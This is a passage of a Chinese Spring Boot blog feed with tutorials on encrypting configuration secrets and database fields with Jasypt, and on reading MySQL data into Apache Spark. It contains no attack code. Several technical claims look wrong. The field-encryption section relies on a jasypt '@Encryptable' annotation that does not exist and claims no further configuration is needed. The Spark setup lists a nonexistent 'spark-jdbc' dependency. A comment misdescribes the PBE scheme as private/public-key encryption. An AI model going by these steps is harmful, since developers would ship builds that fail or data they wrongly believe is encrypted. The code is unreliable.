    <content><![CDATA[<h2 id="配置文件明文加密"><a href="#配置文件明文加密" class="headerlink" title="配置文件明文加密"></a>配置文件明文加密</h2><h3 id="1-引入依赖（XTHS：第一步）"><a href="#1-引入依赖（XTHS：第一步）" class="headerlink" title="1 引入依赖（XTHS：第一步）"></a>1 引入依赖（XTHS：第一步）</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.ulisesbocchio<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jasypt-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jasypt<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jasypt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="2-编写加密工具（XTHS：第二步）"><a href="#2-编写加密工具（XTHS：第二步）" class="headerlink" title="2 编写加密工具（XTHS：第二步）"></a>2 编写加密工具（XTHS：第二步）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zd.channel.cs.utils;</span><br><span class="line"><span class="keyword">import</span> org.jasypt.encryption.pbe.StandardPBEStringEncryptor;</span><br><span class="line"><span class="keyword">import</span> org.jasypt.encryption.pbe.config.EnvironmentStringPBEConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * alibaba druid加解密规则：</span></span><br><span class="line"><span class="comment"> * 明文密码+私钥(privateKey)加密=加密密码</span></span><br><span class="line"><span class="comment"> * 加密密码+公钥(publicKey)解密=明文密码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">JasyptUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加密算法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PBEWITHMD5ANDDES</span> <span class="operator">=</span> <span class="string">&quot;PBEWithMD5AndDES&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> text  待加密原文</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> crack 盐值（密钥）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 加密后的字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>: Jasypt加密（PBEWithMD5AndDES）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encryptWithMD5</span><span class="params">(String text, String crack)</span> &#123;</span><br><span class="line">        <span class="comment">//1.创建加解密工具实例</span></span><br><span class="line">        <span class="type">StandardPBEStringEncryptor</span> <span class="variable">encryptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardPBEStringEncryptor</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.加解密配置</span></span><br><span class="line">        <span class="type">EnvironmentStringPBEConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EnvironmentStringPBEConfig</span>();</span><br><span class="line">        config.setAlgorithm(PBEWITHMD5ANDDES);</span><br><span class="line">        config.setPassword(crack);</span><br><span class="line">        encryptor.setConfig(config);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.加密</span></span><br><span class="line">        <span class="keyword">return</span> encryptor.encrypt(text);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> text  待解密原文</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> crack 盐值（密钥）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 解密后的字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>: Jasypt解密（PBEWithMD5AndDES）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">decryptWithMD5</span><span class="params">(String text, String crack)</span> &#123;</span><br><span class="line">        <span class="type">StandardPBEStringEncryptor</span> <span class="variable">encryptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardPBEStringEncryptor</span>();</span><br><span class="line">        <span class="type">EnvironmentStringPBEConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EnvironmentStringPBEConfig</span>();</span><br><span class="line">        config.setAlgorithm(PBEWITHMD5ANDDES);</span><br><span class="line">        config.setPassword(crack);</span><br><span class="line">        encryptor.setConfig(config);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> encryptor.decrypt(text);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// String s = encryptWithMD5(&quot;明文&quot;, &quot;密钥&quot;);</span></span><br><span class="line">        <span class="comment">// System.out.println(s);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">channelcs1</span> <span class="operator">=</span> decryptWithMD5(<span class="string">&quot;密文&quot;</span>, <span class="string">&quot;密钥&quot;</span>);</span><br><span class="line">        System.out.println(channelcs1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-加密配置类（XTHS：第三步）"><a href="#3-加密配置类（XTHS：第三步）" class="headerlink" title="3 加密配置类（XTHS：第三步）"></a>3 加密配置类（XTHS：第三步）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.jasypt.encryption.StringEncryptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomEncryptorConfig</span> <span class="keyword">implements</span> <span class="title class_">StringEncryptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加密解密的 密钥</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">crack</span> <span class="operator">=</span> <span class="string">&quot;密钥&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">encrypt</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JasyptUtils.encryptWithMD5(s,crack);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">decrypt</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JasyptUtils.decryptWithMD5(s,crack);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-配置类（XTHS：第四步）"><a href="#4-配置类（XTHS：第四步）" class="headerlink" title="4 配置类（XTHS：第四步）"></a>4 配置类（XTHS：第四步）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JasyptConfig</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Bean(&quot;jasyptStringEncryptor&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> StringEncryptor <span class="title function_">jasyptStringEncryptor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CustomEncryptorConfig</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5-配置文件（XTHS：第五步）"><a href="#5-配置文件（XTHS：第五步）" class="headerlink" title="5 配置文件（XTHS：第五步）"></a>5 配置文件（XTHS：第五步）</h3><p>需要加密的内容使用：ENC(密码)格式书写。ENC 是一个特殊的前缀，用于标识被加密过的字符串。当你在配置文件中使用 ENC 前缀时，Jasypt 会自动识别这是一个被加密的属性，然后在应用启动时解密它并将解密后的值应用于相应的配置属性。这允许你在配置文件中以加密的方式存储敏感信息（如密码），同时在应用中解密并使用这些值。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">dynamic:</span></span><br><span class="line">      <span class="attr">datasource:</span></span><br><span class="line">        <span class="attr">master:</span></span><br><span class="line">          <span class="comment">#type: com.zaxxer.hikari.HikariDataSource</span></span><br><span class="line">          <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line">          <span class="attr">url:</span> <span class="string">……</span></span><br><span class="line">          <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">          <span class="attr">password:</span> <span class="string">ENC(3hoLALpSHwctWRbBFJGy1x40gMv78JEG)</span></span><br><span class="line">        <span class="attr">slave:</span></span><br><span class="line">          <span class="comment">#type: com.zaxxer.hikari.HikariDataSource</span></span><br><span class="line">          <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line">          <span class="attr">url:</span> <span class="string">……</span></span><br><span class="line">          <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">          <span class="attr">password:</span> <span class="string">ENC(3hoLALpSHwctWRbBFJGy1x40gMv78JEG)</span></span><br><span class="line">    <span class="attr">hikari:</span></span><br><span class="line">      <span class="attr">minimum-idle:</span> <span class="number">5</span></span><br><span class="line">      <span class="attr">maximum-pool-size:</span> <span class="number">60</span></span><br><span class="line">      <span class="attr">connection-timeout:</span> <span class="number">30000</span></span><br><span class="line">      <span class="attr">idle-timeout:</span> <span class="number">600000</span></span><br><span class="line">      <span class="attr">max-lifetime:</span> <span class="number">1800000</span></span><br></pre></td></tr></table></figure>
<h3 id="6-更安全一些"><a href="#6-更安全一些" class="headerlink" title="6 更安全一些"></a>6 更安全一些</h3><p>上面我们是把密钥写在了代码中，这样做也是有些不太安全的。我们可以使用命令行的方式将密钥传入。在配置文件中加上如下的配置，用于接收启动项目时传入的配置参数：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">my:</span></span><br><span class="line">  <span class="attr">encrypted:</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">$&#123;jasypt.encryptor.password&#125;</span></span><br></pre></td></tr></table></figure>
<p>生成密文时，我们也可以不适用工具类，而是使用命令，步骤如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar your-application.jar -Djasypt.encryptor.password=你的密钥</span><br></pre></td></tr></table></figure>
<ul>
<li>加密：java -cp jasypt-1.9.2.jar org.jasypt.intf.cli.JasyptPBEStringEncryptionCLI input&#x3D;”要加密的值” password&#x3D;”加密密码” algorithm&#x3D;”加密算法”</li>
<li>解密：java -cp jasypt-1.9.2.jar org.jasypt.intf.cli.JasyptPBEStringDecryptionCLI input&#x3D;”加密后的值” password&#x3D;”加密密码” algorithm&#x3D;”加密算法”</li>
</ul>
<h2 id="数据库字段自动加密解密"><a href="#数据库字段自动加密解密" class="headerlink" title="数据库字段自动加密解密"></a>数据库字段自动加密解密</h2><h3 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.ulisesbocchio<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jasypt-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Database Configuration</span></span><br><span class="line"><span class="string">spring.datasource.url=jdbc:mysql://localhost:3306/mytestdb?useSSL=false&amp;serverTimezone=UTC</span></span><br><span class="line"><span class="string">spring.datasource.username=root</span></span><br><span class="line"><span class="string">spring.datasource.password=password</span></span><br><span class="line"><span class="string">spring.jpa.hibernate.ddl-auto=update</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Jasypt Configuration</span></span><br><span class="line"><span class="string">jasypt.encryptor.password=yourSecretKey</span></span><br></pre></td></tr></table></figure>
<h3 id="实体类中标记需要加密的字段"><a href="#实体类中标记需要加密的字段" class="headerlink" title="实体类中标记需要加密的字段"></a>实体类中标记需要加密的字段</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.jasypt.annotation.Encryptable;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Entity;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.GeneratedValue;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.GenerationType;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Id;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Encryptable</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Encryptable</span></span><br><span class="line">    <span class="keyword">private</span> String email; <span class="comment">// 邮箱字段，需要加密</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getters and Setters</span></span><br><span class="line">    <span class="keyword">public</span> Long <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEmail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEmail</span><span class="params">(String email)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>标准的JPA操作，不需要额外的配置来支持加密功能。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="控制层"><a href="#控制层" class="headerlink" title="控制层"></a>控制层</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/users&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserRepository userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">createUser</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userRepository.save(user);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">getUserById</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userRepository.findById(id).orElse(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot2集成五【ApacheSpark框架】</title>
    <url>/cnblogs.github.io/p/f789.html</url>
    <content><![CDATA[<p>随着互联网行业的飞速发展，企业对数据的依赖程度越来越高。在互联网大厂的业务场景中，每天都会产生海量的业务数据，这些数据蕴含着巨大的商业价值。Spring Boot 作为一款流行的 Java 微服务框架，因其快速开发、易于部署等特点，被广泛应用于后端服务开发。而 Apache Spark 作为一个快速、通用的大数据处理引擎，能够高效地处理大规模数据。MySQL 则是最常用的关系型数据库之一，存储着企业的核心业务数据。将 Spring Boot、Apache Spark 和 MySQL 三者整合起来，实现高效的数据处理，成为了众多后端开发人员迫切需要解决的问题。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先要确保本地已经安装好 JDK 。JDK 的版本选择至关重要，Spring Boot 2.x 版本推荐使用 JDK 8 及以上版本，而 Apache Spark 3.x 则要求 JDK 1.8 或更高版本 。如果版本不匹配，可能会出现各种兼容性问题，导致项目无法正常运行。<br>完成 JDK 安装后，打开你的 Spring Boot 项目，找到项目的 pom.xml 文件。在 <dependencies> 标签内，添加 Apache Spark 和 MySQL 的依赖。对于 Apache Spark，除了添加 spark-core、spark-sql 核心依赖外，由于我们要通过 JDBC 连接 MySQL，还需要添加 spark-jdbc 依赖。具体代码如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-core_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-sql_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-jdbc_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的版本号可以根据实际情况进行调整，但要注意不同版本之间可能存在的差异，比如某些新特性在旧版本中不支持，或者旧版本的语法在新版本中会报错。</p>
<h2 id="配置-Spark-和-MySQL-连接信息"><a href="#配置-Spark-和-MySQL-连接信息" class="headerlink" title="配置 Spark 和 MySQL 连接信息"></a>配置 Spark 和 MySQL 连接信息</h2><p>配置环节需要在 Spring Boot 的配置文件中进行操作，你可以选择 application.properties 或 application.yml ，这里以 application.yml 为例进行说明。<br>在 application.yml 中，首先配置 Spring Boot 的数据源信息。url 字段填写 MySQL 数据库的连接地址，其中 localhost 是数据库服务器地址，如果数据库部署在远程服务器，需要替换为对应的 IP 地址；3306 是 MySQL 的默认端口号，若端口有修改需对应调整；your_database 替换为实际的数据库名称；useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf-8 用于设置字符编码，保证中文等特殊字符正常显示；serverTimezone&#x3D;Asia&#x2F;Shanghai 用于设置时区，避免时间显示错误。username 和 password 分别填写数据库的用户名和密码。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/your_database?useUnicode=true&amp;characterEncoding=utf-8&amp;serverTimezone=Asia/Shanghai</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">your_username</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">your_password</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br></pre></td></tr></table></figure>
<p>接着配置 Spark 的相关信息。master 字段设置 Spark 的运行模式，local[<em>] 表示在本地以多线程模式运行，</em> 代表使用本地所有可用的 CPU 核心，适合本地开发和测试。如果是在集群环境中运行，需要填写集群的 Master 地址。app.name 用于设置 Spark 应用的名称，方便在监控和日志中识别。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spark:</span></span><br><span class="line">  <span class="attr">master:</span> <span class="string">local[*]</span></span><br><span class="line">  <span class="attr">app.name:</span> <span class="string">SpringBootSparkMySQL</span></span><br></pre></td></tr></table></figure>
<h2 id="编写数据读取代码"><a href="#编写数据读取代码" class="headerlink" title="编写数据读取代码"></a>编写数据读取代码</h2><p>在 Spring Boot 的服务类中编写数据读取逻辑。首先创建一个新的 Java 类，比如 DataProcessingService 。在类中，通过 Spark 的 SparkSession 来创建与 MySQL 数据库的连接，并读取数据。<br>SparkSession 是 Spark 2.0 引入的新的入口点，它融合了 SparkContext、SQLContext 等功能，使用起来更加方便。通过 builder() 方法构建 SparkSession 实例，设置应用名称和运行模式，然后调用 getOrCreate() 方法获取或创建一个 SparkSession 。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.spark.sql.Dataset;</span><br><span class="line"><span class="keyword">import</span> org.apache.spark.sql.Row;</span><br><span class="line"><span class="keyword">import</span> org.apache.spark.sql.SparkSession;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DataProcessingService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Dataset&lt;Row&gt; <span class="title function_">readDataFromMySQL</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">SparkSession</span> <span class="variable">spark</span> <span class="operator">=</span> SparkSession.builder()</span><br><span class="line">               .appName(<span class="string">&quot;ReadFromMySQL&quot;</span>)</span><br><span class="line">               .master(<span class="string">&quot;local[*]&quot;</span>)</span><br><span class="line">               .getOrCreate();</span><br><span class="line">        Dataset&lt;Row&gt; data = spark.read()</span><br><span class="line">               .format(<span class="string">&quot;jdbc&quot;</span>)</span><br><span class="line">               .option(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;jdbc:mysql://localhost:3306/your_database?useUnicode=true&amp;characterEncoding=utf-8&amp;serverTimezone=Asia/Shanghai&quot;</span>)</span><br><span class="line">               .option(<span class="string">&quot;dbtable&quot;</span>, <span class="string">&quot;your_table&quot;</span>)</span><br><span class="line">               .option(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;your_username&quot;</span>)</span><br><span class="line">               .option(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;your_password&quot;</span>)</span><br><span class="line">               .load();</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上述代码中，format(“jdbc”) 表示使用 JDBC 方式读取数据；option(“dbtable”, “your_table”) 中的 your_table 要替换为实际需要读取数据的表名。读取到的数据会以 Dataset<Row> 的形式返回，后续可以对其进行各种操作。</p>
<h2 id="数据处理：释放-Apache-Spark-的强大能力"><a href="#数据处理：释放-Apache-Spark-的强大能力" class="headerlink" title="数据处理：释放 Apache Spark 的强大能力"></a>数据处理：释放 Apache Spark 的强大能力</h2><p>得到数据后，就可以利用 Apache Spark 强大的数据处理能力对数据进行清洗、转换、分析等操作。<br>比如数据清洗环节，如果数据中存在空值，可以使用 na() 方法进行处理。想要删除包含空值的行，可以调用 drop() 方法；如果想用指定的值填充空值，则调用 fill() 方法。以下是删除包含空值行的示例代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Dataset&lt;Row&gt; cleanedData = data.na().drop();</span><br></pre></td></tr></table></figure>
<p>数据转换方面，假设数据库表中有一个 timestamp 类型的字段，需要将其转换为日期格式。可以使用 withColumn() 方法和日期函数来实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.spark.sql.functions;</span><br><span class="line"><span class="keyword">import</span> org.apache.spark.sql.types.DataTypes;</span><br><span class="line"></span><br><span class="line">Dataset&lt;Row&gt; transformedData = data.withColumn(<span class="string">&quot;date&quot;</span>, functions.to_date(data.col(<span class="string">&quot;timestamp&quot;</span>), <span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>));</span><br></pre></td></tr></table></figure>
<p>在数据分析查询时，Spark SQL 提供了强大的功能。例如，要统计某个表中不同用户的订单数量，可以使用以下代码：</p>
